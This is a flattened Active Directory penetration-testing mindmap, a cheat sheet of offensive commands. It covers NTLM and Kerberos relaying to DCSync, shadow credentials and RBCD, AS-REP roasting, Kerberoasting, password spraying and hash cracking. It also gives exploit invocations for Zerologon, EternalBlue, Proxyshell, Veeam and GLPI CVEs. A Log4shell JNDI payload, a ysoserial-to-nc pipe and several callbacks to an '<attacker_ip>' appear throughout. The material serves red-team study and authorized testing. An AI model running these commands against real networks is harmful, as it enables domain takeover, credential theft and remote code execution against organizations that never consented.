(b4b9b02e6f09a9bd760...)hashcat -m 1000 -a 0 hash.txt <rockyou.txt>john --format=nt hash.txt --wordlist=<rockyou.txt>LM (299bd128c1101fd6)hashcat -m 3000 -a 0 hash.txt <rockyou.txt>john --format=lm hash.txt --wordlist=<rockyou.txt>Man In The Middle (Listen and Relay)Kerberos relaySMB -> LDAP(S)same as NTLM relay, use krbrelayx.pySMB -> SMBsame as NTLM relay, use krbrelayx.pyTo HTTPkrbrelayx.py -t 'http://<pki>/certsrv/certfnsh.asp' --adcs --template DomainController -v '<target_netbios>$' -ip <attacker_ip>ESC8ESC8NTLM relaySMB -> NETLOGONZero-Logon (safe method) (CVE-202-1472)Relay one dc to anotherntlmrelayx.py -t dcsync://<dc_to_ip> -smb2support -auth-smb <user>:<password>DCSYNCDCSYNCTo MsSQLntlmrelayx.py -t mssql://<ip> [-smb2support] -socksMSSQL SocksMSSQL SocksTo HTTP Relay to WSUS WSUSWSUSRelay to CA web enrollement ESC8ESC8To SMBRelay to SMB (if SMB is not signed)ntlmrelayx.py -tf smb_unsigned_ips.txt -smb2support [--ipv6] -socksSMB SocksSMB SocksFind SMB not signed targets (default if not a Domain controler)nxc smb <ip_range> --gen-relay-list smb_unsigned_ips.txtTo LDAP(S)Relay to LDAP if LDAP signing and LDAPS channel binding not enforced (default)ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --interactive # connect to ldap_shell with nc 127.0.0.1 10111LDAP SHELLLDAP SHELLntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --escalate-user <user>Domain adminDomain adminntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --shadow-credentials --shadow-target '<dc_name$>'Shadow CredentialsShadow Credentialsntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --add-computer <computer_name> <computer_password> --delegate-accessRBCDRBCDHTTP(S) -> LDAP(S)Usually from webdav coerce see LDAP(S)see LDAP(S)SMB -> LDAP(S)NTLMv2Remove mic (CVE-2019-1040)  see LDAP(S)see LDAP(S)NTLMv1remove mic (no CVE needed)  see LDAP(S)see LDAP(S)MS08-068 self relay msf> exploit/windows/smb_smb_relay # windows 2000 / windows server 2008Listen Credentials (ldap/http)Credentials (ldap/http)UsernameUsernameHash NTLMv1 or NTLMv2Hash NTLMv1 or NTLMv2smbclient.pyresponder -l <interface> #use --lm to force downgradeValid user (no password)ASREPRoastCVE-2022-33679  Lat move PTTLat move PTTCVE-2022-33679.py <domain>/<user> <target>Blind Kerberoasting Hash found TGSHash found TGSGetUserSPNs.py -no-preauth "<asrep_user>" -usersfile "<user_list.txt>" -dc-host "<dc_ip>" "<domain>"/Rubeus.exe keberoast /domain:<domain> /dc:<dcip> /nopreauth: <asrep_user> /spns:<users.txt>ASREP roasting Hash found ASREPHash found ASREPRubeus.exe asreproast /format:hashcatnxc ldap <dc_ip> -u <users.txt>  -p '' --asreproast <output.txt>GetNPUsers.py <domain>/ -usersfile <users.txt> -format hashcat -outputfile <output.txt>List ASREPRoastable Users (need creds)MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN uPassword Spray usuals passwords  (SeasonYear!, Company123, ...)Clear text CredentialsClear text Credentialskerbrute passwordspray -d <domain> <users.txt> <password>sprayhound -U <users.txt> -p <password> -d <domain> -dc  <dc_ip>nxc smb <dc_ip> -u <users.txt> -p <password> --continue-on-success user == password Clear text CredentialsClear text Credentialssprayhound -U <users.txt> -d <domain> -dc  <dc_ip>   # add --lower to lowercase and --upper to uppercase. Add nothing to get only user=passnxc smb <dc_ip> -u <users.txt> -p <passwords.txt> --no-bruteforce --continue-on-successGet password policy  (you need creds,but you should get the policy  first to avoid locking accounts)Fined Policy (Privileged)ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> pso # can also be runned with a low priv account but less information will be availableGet-ADFineGainedPasswordPolicy -filter *ldapsearch-ad.py --server <dc> -d <domain> -u <user> -p <pass> --type pass-polsdefault policyldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> domain_policyGet-ADDefaultDomainPasswordPolicynxc smb <dc_ip> -u '<user>' -p '<password>' --pass-polAuthorsWith the help of Daathk (@Daahtk)Jenaye (@jenaye_fr)Viking (@Vikingfr)EvelyhaSant0rryu (@Sant0rryu)Made byMayfly (@M4yFly)Projectocd-mindmapsQuick CompromiseWeak websites / servicesnessusnucleinuclei -target <ip_range>GLPI Low accessLow accessAdminAdminCVE_2023_41320 cve_2023_41320.py -u <user> -p <password> -t <ip>CVE-2022-35914 /vendor/htmlawed/htmlawed/htmLawedTest.phpVeeam AdminAdminLow accessLow accessUser AccountUser AccountCVE-2024-40711 (unserialize - Veeam backup)CVE-2024-40711.exe -f binaryformatter -g Veeam -c http://<attacker_ip>:8000/trigger --targetveeam <veeam_ip>CVE-2024-29855 (auth bypass - Veeam Recovery Orchestrator)CVE-2024-29855.py  --start_time <start_time_epoch> --end_time <end_time_epoch> --username <user>@<domain> --target https://<veeam_ip>:<veeam_port>/CVE-2024-29849 (auth bypass - Veeam Backup Enterprise Manager)CVE-2024-29849.py --target https://<veeam_ip>:<veeam_port>/ --callback-server <attacker_ip>:<port>CVE-2023-27532 (creds - Veeam backup)CVE-2023-27532 net.tcp:/<target>:<port>/VeeamHax.exe --target <veeam_server>Exchange AdminAdminProxyshell proxyshell_rce.py -u https://<exchange> -e administrator@<domain>Database Low accessLow accessAdminAdminmsf> use auxiliary/admin/mssql/mssql_enum_sql_loginsLog4shell Low accessLow accessAdminAdmin${jndi:ldap://<ip>:<port>/o=reference}Java Serialiszed port Low accessLow accessAdminAdminysoserial.jar <gadget> '<cmd>' |nc <ip> <port>Java RMI Low accessLow accessAdminAdminmsf> use exploit/multi/misc/java_rmi_serverTomcat/Jboss Manager Low accessLow accessAdminAdminmsf> exploit/multi/http/tomcat_mgr_deploymsf> auxiliary/scanner/http/tomcat_enumEternal Blue MS17-010  Low accessLow accessAdminAdminmsf> exploit/windows/smb/ms17_010_eternalblue # SMBv1 only Zerologon (unsafe) CVE-2020-1472Domain adminDomain admincve-2020-1472-exploit.py <MACHINE_BIOS_NAME> <ip>zerologon-scan '<dc_netbios_name>' '<ip>'No CredentialsTimeRoasting timeroast hashtimeroast hashtimeroast.py <dc_ip> -o <output_log>PXEpassword protected PXE HashPXE Hashpxethief.py 5 '\xxx\boot.var'tftp -i <dp_ip> GET "\xxx\boot.var"no password Credentials (NAA account)Credentials (NAA account)pxethief.py 2 <distribution_point_ip>pxethief.py 1Coerce Coerce SMBCoerce SMBUnauthenticated PetitPotam (CVE-2022-26925)petitpotam.py -d <domain> <listener> <target>Poisoning poisoning HTTPpoisoning HTTPpoisoning LDAPpoisoning LDAPpoisoning SMBpoisoning SMB ARP PoisoningasreqroastPcredz -i <interface> -vHash found ASREQHash found ASREQbettercap DHCPv6 (IPv6 prefered to IPv4)bettercapmitm6 -d <domain>LLMNR / NBTNS / MDNSresponder -l <interface>Bruteforce users UsernameUsernamenmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm= '<domain>',userdb=<user_list_file>" <dc_ip>kerbrute userenum -d <domain> <userlist>Enumerate Users UsernameUsernamenet rpc group members 'Domain Users' -W '<domain> -l <ip> -U '%'nxc smb <dc_ip> --rid-brute 10000 # bruteforcing RIDnxc smb <dc_ip> --usersEnumerate LDAP UsernameUsernameldapsearch -x -H <dc_ip> -s basenmap -n -sV --script 'ldap*' and not brute -p 389 <dc_ip>Anonymous & Guest access on SMB sharessmbclient -U '%' -L //<ip>enum4linux-ng.py -a -u '' -p '' <ip>nxc smb <ip_range> -u 'a' -p ''nxc smb <ip_range> -u '' -p ''Zone transferdig axfr <domain_name> @<name_server>Find DC IPnmap -p 88 --open <ip_range>nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>nmcli dev show <interface>Scan network Vulnerable hostVulnerable hostnmap -sU -sC -sV -oA <output> <ip>nmap -Pn -sC -sV -p- -oA <output> <ip>nmap -Pn -sC -sV -oA <output> <ip>nmap -Pn --script smb-vuln* -p139,445 <ip>nmap -Pn -sV --top-ports 50 --open <ip>nmap -sP -p <ip>nxc smb <ip_range>Active Directory Mindmap v2025.03

